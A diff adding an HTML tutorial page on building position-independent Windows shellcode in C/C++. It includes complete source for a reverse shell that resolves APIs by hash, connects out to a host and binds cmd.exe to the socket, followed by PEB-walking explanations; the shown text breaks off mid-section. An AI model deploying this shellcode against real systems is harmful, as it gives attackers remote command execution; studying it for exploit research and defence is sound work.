@@ -1,0 +1,1509 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Shellcode</title>
+    <link rel="stylesheet" href="styles.css">
+
+    <link rel="stylesheet" href="highlight/styles/stackoverflow-dark.min.css">
+    <script src="highlight/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+<body>
+
+<div class="inner-content"><header class="page-header"><h1 class="page-title">Shellcode</h1></header><div class="page-content"><h2>Introduction</h2><p>A <span style="color: #00ccff;">shellcode</span> is a piece of code which is sent as <span style="color: #00ccff;">payload</span> by an <span style="color: #00ccff;">exploit</span>, is injected in the vulnerable application and is executed. A shellcode must be position independent, i.e. it must work no matter its position in memory and shouldn’t contain null bytes, because the shellcode is usually copied by functions like <span style="color: #00ff00;">strcpy()</span> which stop copying when they encounter a null byte. If a shellcode should contain a null byte, those functions would copy that shellcode only up to the first null byte and thus the shellcode would be incomplete.</p><p>Shellcode is usually written directly in <span style="color: #00ccff;">assembly</span>, but this doesn’t need to be the case. In this section, we’ll develop shellcode in<span style="color: #00ccff;"> C/C++</span> using <span style="color: #00ccff;">Visual Studio 2013</span>. The benefits are evident:</p><ol><li>shorter development times</li><li><span style="color: #00ccff;">intellisense</span></li><li>ease of debugging</li></ol><p>We will use VS 2013 to produce an executable file with our shellcode and then we will extract and fix (i.e. remove the null bytes) the shellcode with a <span style="color: #00ccff;">Python</span> script.</p><h2>C/C++ code</h2><h3>Use only stack variables</h3><p>To write position independent code in C/C++ we must only use variables allocated on the <span style="color: #00ccff;">stack</span>. This means that we can’t write</p>
+
+<pre><code class="language-cpp">char *v = new char[100];
+</code></pre>
+
+<p>because that array would be allocated on the <span style="color: #00ccff;">heap</span>. More important, this would try to call the new operator function from <span style="color: #00ff00;">msvcr120.dll</span> using an absolute address:</p><pre class="ignore:true">00191000 6A 64                push        64h
+00191002 FF 15 90 20 19 00    call        dword ptr ds:[192090h]
+</pre><p>The location 192090h contains the address of the function.</p><p>If we want to call a function imported from a library, we must do so directly, without relying on import tables and the Windows loader.</p><p>Another problem is that the new operator probably requires some kind of initialization performed by the runtime component of the C/C++ language. We don’t want to include all that in our shellcode.</p><p>We can’t use global variables either:</p>
+
+<pre><code class="language-cpp">int x;
+
+int main() {
+  x = 12;
+}
+</code></pre>
+
+<p>The assignment above (if not optimized out), produces</p><pre class="ignore:true">008E1C7E C7 05 30 91 8E 00 0C 00 00 00 mov         dword ptr ds:[8E9130h],0Ch</pre><p>where 8E9130h is the absolute address of the variable <span style="color: #00ff00;">x</span>.</p><p>Strings pose a problem. If we write</p>
+
+<pre><code class="language-cpp">char str[] = "I'm a string";
+printf(str);
+</code></pre>
+
+<p>the string will be put into the section <span style="color: #00ff00;">.rdata</span> of the executable and will be referenced with an absolute address. You must not use <span style="color: #00ff00;">printf</span> in your shellcode: this is just an example to see how <span style="color: #00ff00;">str</span> is referenced. Here’s the asm code:</p><pre class="ignore:true">00A71006 8D 45 F0             lea         eax,[str]
+00A71009 56                   push        esi
+00A7100A 57                   push        edi
+00A7100B BE 00 21 A7 00       mov         esi,0A72100h
+00A71010 8D 7D F0             lea         edi,[str]
+00A71013 50                   push        eax
+00A71014 A5                   movs        dword ptr es:[edi],dword ptr [esi]
+00A71015 A5                   movs        dword ptr es:[edi],dword ptr [esi]
+00A71016 A5                   movs        dword ptr es:[edi],dword ptr [esi]
+00A71017 A4                   movs        byte ptr es:[edi],byte ptr [esi]
+00A71018 FF 15 90 20 A7 00    call        dword ptr ds:[0A72090h]
+</pre><p>As you can see, the string, located at the address A72100h in the <span style="color: #00ff00;">.rdata</span> section, is copied onto the stack (<span style="color: #00ff00;">str</span> points to the stack) through <span style="color: #00ff00;">movsd</span> and <span style="color: #00ff00;">movsb</span>. Note that A72100h is an absolute address. This code is definitely not position independent.</p><p>If we write</p>
+
+<pre><code class="language-cpp">char *str = "I'm a string";
+printf(str);
+</code></pre>
+
+<p>the string is still put into the <span style="color: #00ff00;">.rdata</span> section, but it’s not copied onto the stack:</p><pre class="ignore:true">00A31000 68 00 21 A3 00       push        0A32100h
+00A31005 FF 15 90 20 A3 00    call        dword ptr ds:[0A32090h]</pre><p>The absolute position of the string in <span style="color: #00ff00;">.rdata</span> is A32100h.<br> How can we makes this code position independent?<br> The simpler (partial) solution is rather cumbersome:</p>
+
+<pre><code class="language-cpp">char str[] = { 'I', '\'', 'm', ' ', 'a', ' ', 's', 't', 'r', 'i', 'n', 'g', '\0' };
+printf(str);
+</code></pre>
+
+<p>Here’s the asm code:</p><pre class="ignore:true">012E1006 8D 45 F0             lea         eax,[str]
+012E1009 C7 45 F0 49 27 6D 20 mov         dword ptr [str],206D2749h
+012E1010 50                   push        eax
+012E1011 C7 45 F4 61 20 73 74 mov         dword ptr [ebp-0Ch],74732061h
+012E1018 C7 45 F8 72 69 6E 67 mov         dword ptr [ebp-8],676E6972h
+012E101F C6 45 FC 00          mov         byte ptr [ebp-4],0
+012E1023 FF 15 90 20 2E 01    call        dword ptr ds:[12E2090h]
+</pre><p>Except for the call to <span style="color: #00ff00;">printf</span>, this code is position independent because portions of the string are coded directly in the source operands of the <span style="color: #00ff00;">mov</span> instructions. Once the string has been built on the stack, it can be used.</p><p>Unfortunately, when the string is longer, this method doesn’t work anymore. In fact, the code</p>
+
+<pre><code class="language-cpp">char str[] = { 'I', '\'', 'm', ' ', 'a', ' ', 'v', 'e', 'r', 'y', ' ', 'l', 'o', 'n', 'g', ' ', 's', 't', 'r', 'i', 'n', 'g', '\0' };
+printf(str);
+</code></pre>
+
+<p>produces</p><pre class="ignore:true">013E1006 66 0F 6F 05 00 21 3E 01 movdqa      xmm0,xmmword ptr ds:[13E2100h]
+013E100E 8D 45 E8             lea         eax,[str]
+013E1011 50                   push        eax
+013E1012 F3 0F 7F 45 E8       movdqu      xmmword ptr [str],xmm0
+013E1017 C7 45 F8 73 74 72 69 mov         dword ptr [ebp-8],69727473h
+013E101E 66 C7 45 FC 6E 67    mov         word ptr [ebp-4],676Eh
+013E1024 C6 45 FE 00          mov         byte ptr [ebp-2],0
+013E1028 FF 15 90 20 3E 01    call        dword ptr ds:[13E2090h]
+</pre><p>As you can see, part of the string is located in the <span style="color: #00ff00;">.rdata</span> section at the address 13E2100h, while other parts of the string are encoded in the source operands of the <span style="color: #00ff00;">mov</span> instructions like before.</p><p>The solution I came up with is to allow code like</p>
+
+<pre><code class="language-cpp">char *str = "I'm a very long string";
+</code></pre>
+
+<p>and fix the shellcode with a Python script. That script needs to extract the referenced strings from the <span style="color: #00ff00;">.rdata</span> section, put them into the shellcode and fix the relocations. We’ll see how soon.</p><h3>Don’t call Windows API directly</h3><p>We can’t write</p>
+
+<pre><code class="language-cpp">WaitForSingleObject(procInfo.hProcess, INFINITE);
+</code></pre>
+
+<p>in our C/C++ code because “WaitForSingleObject” needs to be imported from kernel32.dll.</p><p>The process of importing a function from a library is rather complex. In a nutshell, the <span style="color: #00ccff;">PE</span> file contains an <span style="color: #00ccff;">import table</span> and an <span style="color: #00ccff;">import address table</span> (<span style="color: #00ccff;">IAT</span>). The import table contains information about which functions to import from which libraries. The IAT is compiled by the Windows loader when the executable is loaded and contains the addresses of the imported functions. The code of the executable call the imported functions with a level of indirection. For example:</p><pre class="ignore:true"> 001D100B FF 15 94 20 1D 00    call        dword ptr ds:[1D2094h]</pre><p>The address 1D2094h is the location of the entry (in the IAT) which contains the address of the function <span style="color: #00ff00;">MessageBoxA</span>. This level of indirection is useful because the call above doesn’t need to be fixed (unless the executable is relocated). The only thing the Windows loader needs to fix is the dword at 1D2094h, which is the address of the <span style="color: #00ff00;">MessageBoxA</span> function.</p><p>The solution is to get the addresses of the Windows functions directly from the in-memory data structures of Windows. We’ll see how this is done later.</p><h3>Install VS 2013 CTP</h3><p>First of all, download the <span style="color: #00ff00;">Visual C++ Compiler November 2013 CTP</span> from <a href="http://www.microsoft.com/en-us/download/details.aspx?id=41151">here</a> and install it.</p><h3>Create a New Project</h3><p>Go to <span style="color: #00ff00;">File</span>→<span style="color: #00ff00;">New</span>→<span style="color: #00ff00;">Project…</span>, select <span style="color: #00ff00;">Installed</span>→<span style="color: #00ff00;">Templates</span>→<span style="color: #00ff00;">Visual C++</span>→<span style="color: #00ff00;">Win32</span>→<span style="color: #00ff00;">Win32 Console Application</span>, choose a name for the project (I chose <span style="color: #00ff00;">shellcode</span>) and hit OK.</p><p>Go to <span style="color: #00ff00;">Project</span>→<span style="color: #00ff00;">&lt;project name&gt; properties</span> and a new dialog will appear. Apply the changes to all configurations (<span style="color: #00ccff;">Release</span> and <span style="color: #00ccff;">Debug</span>) by setting <span style="color: #00ff00;">Configuration</span> (top left of the dialog) to <span style="color: #00ff00;">All Configurations</span>. Then, expand <span style="color: #00ff00;">Configuration Properties</span> and under <span style="color: #00ff00;">General</span> modify <span style="color: #00ff00;">Platform Toolset</span> so that it says <span style="color: #00ff00;">Visual C++ Compiler Nov 2013 CTP (CTP_Nov2013)</span>. This way you’ll be able to use some features of <span style="color: #00ccff;">C++11</span> and <span style="color: #00ccff;">C++14</span> like <span style="color: #00ff00;">static_assert</span>.</p><h3>Example of Shellcode</h3><p>Here’s the code for a simple <span style="color: #00ccff;">reverse shell </span>(<a href="http://en.wikipedia.org/wiki/Shellcode#Remote">definition</a>). Add a file named <span style="color: #00ff00;">shellcode.cpp</span> to the project and copy this code in it (or just <a href="code/shellcode.cpp">download</a> it). Don’t try to understand all the code right now. We’ll discuss it at length.</p>
+
+<pre><code class="language-cpp">// Simple reverse shell shellcode by Massimiliano Tomassoli (2015)
+// NOTE: Compiled on Visual Studio 2013 + "Visual C++ Compiler November 2013 CTP".
+
+#include &lt;WinSock2.h&gt;               // must preceed #include &lt;windows.h&gt;
+#include &lt;WS2tcpip.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;winnt.h&gt;
+#include &lt;winternl.h&gt;
+#include &lt;stddef.h&gt;
+#include &lt;stdio.h&gt;
+
+#define htons(A) ((((WORD)(A) &amp; 0xff00) &gt;&gt; 8) | (((WORD)(A) &amp; 0x00ff) &lt;&lt; 8))
+
+_inline PEB *getPEB() {
+    PEB *p;
+    __asm {
+        mov     eax, fs:[30h]
+        mov     p, eax
+    }
+    return p;
+}
+
+DWORD getHash(const char *str) {
+    DWORD h = 0;
+    while (*str) {
+        h = (h &gt;&gt; 13) | (h &lt;&lt; (32 - 13));       // ROR h, 13
+        h += *str &gt;= 'a' ? *str - 32 : *str;    // convert the character to uppercase
+        str++;
+    }
+    return h;
+}
+
+DWORD getFunctionHash(const char *moduleName, const char *functionName) {
+    return getHash(moduleName) + getHash(functionName);
+}
+
+LDR_DATA_TABLE_ENTRY *getDataTableEntry(const LIST_ENTRY *ptr) {
+    int list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+    return (LDR_DATA_TABLE_ENTRY *)((BYTE *)ptr - list_entry_offset);
+}
+
+// NOTE: This function doesn't work with forwarders. For instance, kernel32.ExitThread forwards to
+//       ntdll.RtlExitUserThread. The solution is to follow the forwards manually.
+PVOID getProcAddrByHash(DWORD hash) {
+    PEB *peb = getPEB();
+    LIST_ENTRY *first = peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;
+    LIST_ENTRY *ptr = first;
+    do {                            // for each module
+        LDR_DATA_TABLE_ENTRY *dte = getDataTableEntry(ptr);
+        ptr = ptr-&gt;Flink;
+
+        BYTE *baseAddress = (BYTE *)dte-&gt;DllBase;
+        if (!baseAddress)           // invalid module(???)
+            continue;
+        IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)baseAddress;
+        IMAGE_NT_HEADERS *ntHeaders = (IMAGE_NT_HEADERS *)(baseAddress + dosHeader-&gt;e_lfanew);
+        DWORD iedRVA = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+        if (!iedRVA)                // Export Directory not present
+            continue;
+        IMAGE_EXPORT_DIRECTORY *ied = (IMAGE_EXPORT_DIRECTORY *)(baseAddress + iedRVA);
+        char *moduleName = (char *)(baseAddress + ied-&gt;Name);
+        DWORD moduleHash = getHash(moduleName);
+
+        // The arrays pointed to by AddressOfNames and AddressOfNameOrdinals run in parallel, i.e. the i-th
+        // element of both arrays refer to the same function. The first array specifies the name whereas
+        // the second the ordinal. This ordinal can then be used as an index in the array pointed to by
+        // AddressOfFunctions to find the entry point of the function.
+        DWORD *nameRVAs = (DWORD *)(baseAddress + ied-&gt;AddressOfNames);
+        for (DWORD i = 0; i &lt; ied-&gt;NumberOfNames; ++i) {
+            char *functionName = (char *)(baseAddress + nameRVAs[i]);
+            if (hash == moduleHash + getHash(functionName)) {
+                WORD ordinal = ((WORD *)(baseAddress + ied-&gt;AddressOfNameOrdinals))[i];
+                DWORD functionRVA = ((DWORD *)(baseAddress + ied-&gt;AddressOfFunctions))[ordinal];
+                return baseAddress + functionRVA;
+            }
+        }
+    } while (ptr != first);
+
+    return NULL;            // address not found
+}
+
+#define HASH_LoadLibraryA           0xf8b7108d
+#define HASH_WSAStartup             0x2ddcd540
+#define HASH_WSACleanup             0x0b9d13bc
+#define HASH_WSASocketA             0x9fd4f16f
+#define HASH_WSAConnect             0xa50da182
+#define HASH_CreateProcessA         0x231cbe70
+#define HASH_inet_ntoa              0x1b73fed1
+#define HASH_inet_addr              0x011bfae2
+#define HASH_getaddrinfo            0xdc2953c9
+#define HASH_getnameinfo            0x5c1c856e
+#define HASH_ExitThread             0x4b3153e0
+#define HASH_WaitForSingleObject    0xca8e9498
+
+#define DefineFuncPtr(name)     decltype(name) *My_##name = (decltype(name) *)getProcAddrByHash(HASH_##name)
+
+int entryPoint() {
+//  printf("0x%08x\n", getFunctionHash("kernel32.dll", "WaitForSingleObject"));
+//  return 0;
+
+    // NOTE: we should call WSACleanup() and freeaddrinfo() (after getaddrinfo()), but
+    //       they're not strictly needed.
+
+    DefineFuncPtr(LoadLibraryA);
+
+    My_LoadLibraryA("ws2_32.dll");
+
+    DefineFuncPtr(WSAStartup);
+    DefineFuncPtr(WSASocketA);
+    DefineFuncPtr(WSAConnect);
+    DefineFuncPtr(CreateProcessA);
+    DefineFuncPtr(inet_ntoa);
+    DefineFuncPtr(inet_addr);
+    DefineFuncPtr(getaddrinfo);
+    DefineFuncPtr(getnameinfo);
+    DefineFuncPtr(ExitThread);
+    DefineFuncPtr(WaitForSingleObject);
+
+    const char *hostName = "127.0.0.1";
+    const int hostPort = 123;
+
+    WSADATA wsaData;
+
+    if (My_WSAStartup(MAKEWORD(2, 2), &amp;wsaData))
+        goto __end;         // error
+    SOCKET sock = My_WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    if (sock == INVALID_SOCKET)
+        goto __end;
+
+    addrinfo *result;
+    if (My_getaddrinfo(hostName, NULL, NULL, &amp;result))
+        goto __end;
+    char ip_addr[16];
+    My_getnameinfo(result-&gt;ai_addr, result-&gt;ai_addrlen, ip_addr, sizeof(ip_addr), NULL, 0, NI_NUMERICHOST);
+
+    SOCKADDR_IN remoteAddr;
+    remoteAddr.sin_family = AF_INET;
+    remoteAddr.sin_port = htons(hostPort);
+    remoteAddr.sin_addr.s_addr = My_inet_addr(ip_addr);
+
+    if (My_WSAConnect(sock, (SOCKADDR *)&amp;remoteAddr, sizeof(remoteAddr), NULL, NULL, NULL, NULL))
+        goto __end;
+
+    STARTUPINFOA sInfo;
+    PROCESS_INFORMATION procInfo;
+    SecureZeroMemory(&amp;sInfo, sizeof(sInfo));        // avoids a call to _memset
+    sInfo.cb = sizeof(sInfo);
+    sInfo.dwFlags = STARTF_USESTDHANDLES;
+    sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)sock;
+    My_CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &amp;sInfo, &amp;procInfo);
+
+    // Waits for the process to finish.
+    My_WaitForSingleObject(procInfo.hProcess, INFINITE);
+
+__end:
+    My_ExitThread(0);
+
+    return 0;
+}
+
+int main() {
+    return entryPoint();
+}
+</code></pre>
+
+<p></p><h3>Compiler Configuration</h3><p>Go to <span style="color: #00ff00;">Project</span>→<span style="color: #00ff00;">&lt;project name&gt; properties</span>, expand <span style="color: #00ff00;">Configuration Properties</span> and then <span style="color: #00ff00;">C/C++</span>. Apply the changes to the Release Configuration.</p><p>Here are the settings you need to change:</p><ul><li><span style="color: #00ff00;">General</span>:<ul><li><span style="color: #00ff00;">SDL Checks</span>: No (/sdl-)<br> Maybe this is not needed, but I disabled them anyway.</li></ul></li><li><span style="color: #00ff00;">Optimization</span>:<ul><li><span style="color: #00ff00;">Optimization</span>: Minimize Size (/O1)<br> This is very important! We want a shellcode as small as possible.</li><li><span style="color: #00ff00;">Inline Function Expansion</span>: Only __inline (/Ob1)<br> If a function <span style="color: #00ff00;">A</span> calls a function <span style="color: #00ff00;">B</span> and <span style="color: #00ff00;">B</span> is inlined, then the call to <span style="color: #00ff00;">B</span> is replaced with the code of <span style="color: #00ff00;">B</span> itself. With this setting we tell VS 2013 to inline only functions decorated with <span style="color: #00ff00;">_inline</span>.<br> This is critical! <span style="color: #00ff00;">main()</span> just calls the <span style="color: #00ff00;">entryPoint</span> function of our shellcode. If the <span style="color: #00ff00;">entryPoint</span> function is short, it might be inlined into <span style="color: #00ff00;">main()</span>. This would be disastrous because <span style="color: #00ff00;">main()</span> wouldn’t indicate the end of our shellcode anymore (in fact, it would contain part of it). We’ll see why this is important later.</li><li><span style="color: #00ff00;">Enable Intrinsic Functions</span>: Yes (/Oi)<br> I don’t know if this should be disabled.</li><li><span style="color: #00ff00;">Favor Size Or Speed</span>: Favor small code (/Os)</li><li><span style="color: #00ff00;">Whole Program Optimization</span>: Yes (/GL)</li></ul></li><li><span style="color: #00ff00;">Code Generation</span>:<ul><li><span style="color: #00ff00;">Security Check</span>: Disable Security Check (/GS-)<br> We don’t need any security checks!</li><li><span style="color: #00ff00;">Enable Function-Level linking</span>: Yes (/Gy)</li></ul></li></ul><h3>Linker Configuration</h3><p>Go to <span style="color: #00ff00;">Project</span>→<span style="color: #00ff00;">&lt;project name&gt; properties</span>, expand <span style="color: #00ff00;">Configuration Properties</span> and then <span style="color: #00ff00;">Linker</span>. Apply the changes to the Release Configuration. Here are the settings you need to change:</p><ul><li><span style="color: #00ff00;">General</span>:<ul><li><span style="color: #00ff00;">Enable Incremental Linking</span>: No (/INCREMENTAL:NO)</li></ul></li><li><span style="color: #00ff00;">Debugging</span>:<ul><li><span style="color: #00ff00;">Generate Map File</span>: Yes (/MAP)<br> Tells the linker to generate a map file containing the structure of the EXE.</li><li><span style="color: #00ff00;">Map File Name</span>: mapfile<br> This is the name of the map file. Choose whatever name you like.</li></ul></li><li><span style="color: #00ff00;">Optimization</span>:<ul><li><span style="color: #00ff00;">References</span>: Yes (/OPT:REF)<br> This is very important to generate a small shellcode because eliminates functions and data that are never referenced by the code.</li><li><span style="color: #00ff00;">Enable COMDAT Folding</span>: Yes (/OPT:ICF)</li><li><span style="color: #00ff00;">Function Order</span>: function_order.txt<br> This reads a file called <span style="color: #00ff00;">function_order.txt</span> which specifies the order in which the functions must appear in the code section. We want the function <span style="color: #00ff00;">entryPoint</span> to be the first function in the code section so my <span style="color: #00ff00;">function_order.txt</span> contains just a single line with the word <span style="color: #00ff00;">?entryPoint@@YAHXZ</span>. You can find the names of the functions in the map file.</li></ul></li></ul><h3>getProcAddrByHash</h3><p>This function returns the address of a function exported by a module (.exe or .dll) present in memory, given the <span style="color: #00ccff;">hash</span> associated with the module and the function. It’s certainly possible to find functions by name, but that would waste considerable space because those names should be included in the shellcode. On the other hand, a hash is only 4 bytes. Since we don’t use two hashes (one for the module and the other for the function), <span style="color: #00ff00;">getProcAddrByHash</span> needs to consider all the modules loaded in memory.</p><p>The hash for <span style="color: #00ff00;">MessageBoxA</span>, exported by <span style="color: #00ff00;">user32.dll</span>, can be computed as follows:</p>
+
+<pre><code class="language-cpp">DWORD hash = getFunctionHash("user32.dll", "MessageBoxA");
+</code></pre>
+
+<p>where hash is the sum of <span style="color: #00ff00;">getHash(“user32.dll”)</span> and <span style="color: #00ff00;">getHash(“MessageBoxA”)</span>. The implementation of <span style="color: #00ff00;">getHash</span> is very simple:</p>
+
+<pre><code class="language-cpp">DWORD getHash(const char *str) {
+    DWORD h = 0;
+    while (*str) {
+        h = (h &gt;&gt; 13) | (h &lt;&lt; (32 - 13));       // ROR h, 13
+        h += *str &gt;= 'a' ? *str - 32 : *str;    // convert the character to uppercase
+        str++;
+    }
+    return h;
+}
+</code></pre>
+
+<p>As you can see, the hash is case-insensitive. This is important because in some versions of Windows the names in memory are all uppercase.</p><p>First, <span style="color: #00ff00;">getProcAddrByHash</span> gets the address of the <span style="color: #00ccff;">TEB</span> (<span style="color: #00ccff;">T</span>hread <span style="color: #00ccff;">E</span>nvironment <span style="color: #00ccff;">B</span>lock):</p>
+
+<pre><code class="language-cpp">PEB *peb = getPEB();
+</code></pre>
+
+<p>where</p>
+
+<pre><code class="language-cpp">_inline PEB *getPEB() {
+    PEB *p;
+    __asm {
+        mov     eax, fs:[30h]
+        mov     p, eax
+    }
+    return p;
+}
+</code></pre>
+
+<p>The <span style="color: #00ccff;">selector</span> <span style="color: #00ff00;">fs</span> is associated with a <span style="color: #00ccff;">segment</span> which starts at the address of the TEB. At offset 30h, the TEB contains a pointer to the <span style="color: #00ccff;">PEB</span> (<span style="color: #00ccff;">P</span>rocess <span style="color: #00ccff;">E</span>nvironment <span style="color: #00ccff;">B</span>lock). We can see this in WinDbg:</p><pre class="ignore:true">0:000&gt; dt _TEB @$teb
+ntdll!_TEB
++0x000 NtTib            : _NT_TIB
++0x01c EnvironmentPointer : (null)
++0x020 ClientId         : _CLIENT_ID
++0x028 ActiveRpcHandle  : (null)
++0x02c ThreadLocalStoragePointer : 0x7efdd02c Void
++0x030 ProcessEnvironmentBlock : 0x7efde000 _PEB
++0x034 LastErrorValue   : 0
++0x038 CountOfOwnedCriticalSections : 0
++0x03c CsrClientThread  : (null)
+<span style="color: #00ff00;">&lt;snip&gt;</span></pre><p>The PEB, as the name implies, is associated with the current process and contains, among other things, information about the modules loaded into the process address space.</p><p>Here’s <span style="color: #00ff00;">getProcAddrByHash</span> again:</p>
+
+<pre><code class="language-cpp">PVOID getProcAddrByHash(DWORD hash) {
+    PEB *peb = getPEB();
+    LIST_ENTRY *first = peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;
+    LIST_ENTRY *ptr = first;
+    do {                            // for each module
+        LDR_DATA_TABLE_ENTRY *dte = getDataTableEntry(ptr);
+        ptr = ptr-&gt;Flink;
+        .
+        .
+        .
+    } while (ptr != first);
+
+    return NULL;            // address not found
+}
+</code></pre>
+
+<p>Here’s part of the PEB:</p><pre class="ignore:true">0:000&gt; dt _PEB @$peb
+ntdll!_PEB
+   +0x000 InheritedAddressSpace : 0 ''
+   +0x001 ReadImageFileExecOptions : 0 ''
+   +0x002 BeingDebugged    : 0x1 ''
+   +0x003 BitField         : 0x8 ''
+   +0x003 ImageUsesLargePages : 0y0
+   +0x003 IsProtectedProcess : 0y0
+   +0x003 IsLegacyProcess  : 0y0
+   +0x003 IsImageDynamicallyRelocated : 0y1
+   +0x003 SkipPatchingUser32Forwarders : 0y0
+   +0x003 SpareBits        : 0y000
+   +0x004 Mutant           : 0xffffffff Void
+   +0x008 ImageBaseAddress : 0x00060000 Void
+   +0x00c Ldr              : 0x76fd0200 _PEB_LDR_DATA
+   +0x010 ProcessParameters : 0x00681718 _RTL_USER_PROCESS_PARAMETERS
+   +0x014 SubSystemData    : (null)
+   +0x018 ProcessHeap      : 0x00680000 Void
+   <span style="color: #00ff00;">&lt;snip&gt;</span></pre><p>At offset 0Ch, there is a field called <span style="color: #00ff00;">Ldr</span> which points to a <span style="color: #00ff00;">PEB_LDR_DATA</span> data structure. Let’s see that in WinDbg:</p><pre class="ignore:true">0:000&gt; dt _PEB_LDR_DATA 0x76fd0200
+ntdll!_PEB_LDR_DATA
+   +0x000 Length           : 0x30
+   +0x004 Initialized      : 0x1 ''
+   +0x008 SsHandle         : (null)
+   +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x683080 - 0x6862c0 ]
+   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x683088 - 0x6862c8 ]
+   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x683120 - 0x6862d0 ]
+   +0x024 EntryInProgress  : (null)
+   +0x028 ShutdownInProgress : 0 ''
+   +0x02c ShutdownThreadId : (null)</pre><p><span style="color: #00ff00;">InMemoryOrderModuleList</span> is a doubly-linked list of <span style="color: #00ff00;">LDR_DATA_TABLE_ENTRY</span> structures associated with the modules loaded in the current process’s address space. To be precise, <span style="color: #00ff00;">InMemoryOrderModuleList</span> is a <span style="color: #00ff00;">LIST_ENTRY</span>, which contains two fields:</p><pre class="ignore:true">0:000&gt; dt _LIST_ENTRY
+ntdll!_LIST_ENTRY
+   +0x000 Flink            : Ptr32 _LIST_ENTRY
+   +0x004 Blink            : Ptr32 _LIST_ENTRY</pre><p><span style="color: #00ff00;">Flink</span> means forward link and <span style="color: #00ff00;">Blink</span> backward link. Flink points to the <span style="color: #00ff00;">LDR_DATA_TABLE_ENTRY</span> of the first module. Well, not exactly: Flink points to a <span style="color: #00ff00;">LIST_ENTRY</span> structure contained in the structure <span style="color: #00ff00;">LDR_DATA_TABLE_ENTRY</span>.</p><p>Let’s see how <span style="color: #00ff00;">LDR_DATA_TABLE_ENTRY</span> is defined:</p><pre class="ignore:true">0:000&gt; dt _LDR_DATA_TABLE_ENTRY
+ntdll!_LDR_DATA_TABLE_ENTRY
+   +0x000 InLoadOrderLinks : _LIST_ENTRY
+   +0x008 InMemoryOrderLinks : _LIST_ENTRY
+   +0x010 InInitializationOrderLinks : _LIST_ENTRY
+   +0x018 DllBase          : Ptr32 Void
+   +0x01c EntryPoint       : Ptr32 Void
+   +0x020 SizeOfImage      : Uint4B
+   +0x024 FullDllName      : _UNICODE_STRING
+   +0x02c BaseDllName      : _UNICODE_STRING
+   +0x034 Flags            : Uint4B
+   +0x038 LoadCount        : Uint2B
+   +0x03a TlsIndex         : Uint2B
+   +0x03c HashLinks        : _LIST_ENTRY
+   +0x03c SectionPointer   : Ptr32 Void
+   +0x040 CheckSum         : Uint4B
+   +0x044 TimeDateStamp    : Uint4B
+   +0x044 LoadedImports    : Ptr32 Void
+   +0x048 EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT
+   +0x04c PatchInformation : Ptr32 Void
+   +0x050 ForwarderLinks   : _LIST_ENTRY
+   +0x058 ServiceTagLinks  : _LIST_ENTRY
+   +0x060 StaticLinks      : _LIST_ENTRY
+   +0x068 ContextInformation : Ptr32 Void
+   +0x06c OriginalBase     : Uint4B
+   +0x070 LoadTime         : _LARGE_INTEGER</pre><p><span style="color: #00ff00;">InMemoryOrderModuleList.Flink</span> points to <span style="color: #00ff00;">_LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks</span> which is at offset 8, so we must subtract 8 to get the address of <span style="color: #00ff00;">_LDR_DATA_TABLE_ENTRY</span>.</p><p>First, let’s get the Flink pointer:</p><pre class="ignore:true">+0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x683080 - 0x6862c0 ]</pre><p>Its value is 0x683080, so the <span style="color: #00ff00;">_LDR_DATA_TABLE_ENTRY</span> structure is at address 0x683080 – 8 = 0x683078:</p><pre class="ignore:true">0:000&gt; dt _LDR_DATA_TABLE_ENTRY 683078
+ntdll!_LDR_DATA_TABLE_ENTRY
+   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x359469e5 - 0x1800eeb1 ]
+   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x683110 - 0x76fd020c ]
+   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x683118 - 0x76fd0214 ]
+   +0x018 DllBase          : (null)
+   +0x01c EntryPoint       : (null)
+   +0x020 SizeOfImage      : 0x60000
+   +0x024 FullDllName      : _UNICODE_STRING "蒮ｍ쿟ﾹ엘ﾬ膪ｎ???"
+   +0x02c BaseDllName      : _UNICODE_STRING "C:\Windows\SysWOW64\calc.exe"
+   +0x034 Flags            : 0x120010
+   +0x038 LoadCount        : 0x2034
+   +0x03a TlsIndex         : 0x68
+   +0x03c HashLinks        : _LIST_ENTRY [ 0x4000 - 0xffff ]
+   +0x03c SectionPointer   : 0x00004000 Void
+   +0x040 CheckSum         : 0xffff
+   +0x044 TimeDateStamp    : 0x6841b4
+   +0x044 LoadedImports    : 0x006841b4 Void
+   +0x048 EntryPointActivationContext : 0x76fd4908 _ACTIVATION_CONTEXT
+   +0x04c PatchInformation : 0x4ce7979d Void
+   +0x050 ForwarderLinks   : _LIST_ENTRY [ 0x0 - 0x0 ]
+   +0x058 ServiceTagLinks  : _LIST_ENTRY [ 0x6830d0 - 0x6830d0 ]
+   +0x060 StaticLinks      : _LIST_ENTRY [ 0x6830d8 - 0x6830d8 ]
+   +0x068 ContextInformation : 0x00686418 Void
+   +0x06c OriginalBase     : 0x6851a8
+   +0x070 LoadTime         : _LARGE_INTEGER 0x76f0c9d0</pre><p>As you can see, I’m debugging calc.exe in WinDbg! That’s right: the first module is the executable itself. The important field is <span style="color: #00ff00;">DLLBase</span> (c). Given the base address of the module, we can analyze the PE file loaded in memory and get all kinds of information, like the addresses of the exported functions.</p><p>That’s exactly what we do in <span style="color: #00ff00;">getProcAddrByHash</span>:</p>
+   
+<pre><code class="language-cpp">    .
+    .
+    .
+    BYTE *baseAddress = (BYTE *)dte-&gt;DllBase;
+    if (!baseAddress)           // invalid module(???)
+        continue;
